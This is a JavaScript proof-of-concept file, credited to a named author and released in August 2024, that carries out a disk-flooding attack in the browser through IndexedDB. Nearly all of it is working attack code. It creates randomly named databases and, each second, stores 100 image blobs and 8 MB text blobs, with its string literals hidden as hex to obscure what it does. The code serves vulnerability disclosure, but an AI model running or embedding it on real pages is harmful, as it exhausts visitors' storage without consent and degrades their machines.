/**
 * IFA
 * PoC exposing a critical IndexedDB vulnerability that enables a disk flooding attack by exploiting the lack of restrictions.
 * 
 * @author Jose Pino
 * @contact jose@pino.sh (https://x.com/jofpin)
 * @github github.com/jofpin/ifa
 * @license MIT
 * 
 * © 2024 Jose Pino | Released: Aug 21, 2024
 */
const IFA = {
    _: s => s.split(" ").map(h => String.fromCharCode(parseInt(h, 16))).join(""),
    sn: null,
    db: null,
    img: null,
    blobs: [],
    gid: function() {
        return "IFA_" + Math.random().toString(0x24).substr(0x2, 0x9);
    },
    gsn: function() {
        return Array(Math.random() * 5 + 1 | 0).fill().map(() => String.fromCharCode(0x61 + Math.random() * 0x1a | 0)).join("");
    },
    init: function() {
        const dbid = this.gid();
        this.sn = this.gsn();

        return new Promise(resolve => {
            let req = indexedDB.open(dbid, 0x1);
            req.onupgradeneeded = e => e.target.result.createObjectStore(this.sn, { autoIncrement: true });  
            req.onsuccess = e => {
                IFA.db = e.target.result;
                resolve();
            };
        });
    },
    store: function() {
        let tx = this.db.transaction([this.sn], this._("72 65 61 64 77 72 69 74 65")).objectStore(this.sn);
        
        this.blobs.forEach(p => {
            tx.add(p.i);
            tx.add(p.t);
        });

        this.blobs = [];
    },
    gen: function(txt) {
        const size = 0x800000;
        const rep = txt.repeat(size / txt.length);
        return new Blob([rep], { type: this._("74 65 78 74 2F 70 6C 61 69 6E") });
    },
    inject: function(txt) {
        fetch(this.img)
            .then(r => r.blob())
            .then(b => {
                const t = this.gen(txt);
                this.blobs.push({ i: b, t: t });
                if (this.blobs.length >= 0x3) {
                    this.store();
                }
            });
    },
    run: function(conf) {
        if (!conf.img.startsWith(this._("64 61 74 61 3A 69 6D 61 67 65"))) {
            throw new Error(this._("49 6D 61 67 65 20 6D 75 73 74 20 62 65 20 69 6E 20 62 61 73 65 36 34 20 66 6F 72 6D 61 74"));
        }
        this.img = conf.img;
        this.init().then(() => {
            setInterval(() => {
                for (let i = 0x0; i < 0x64; i++) {
                    this.inject(conf.txt);
                }
            }, 0x3e8);
        }).catch(error => console.error(error));
    }
};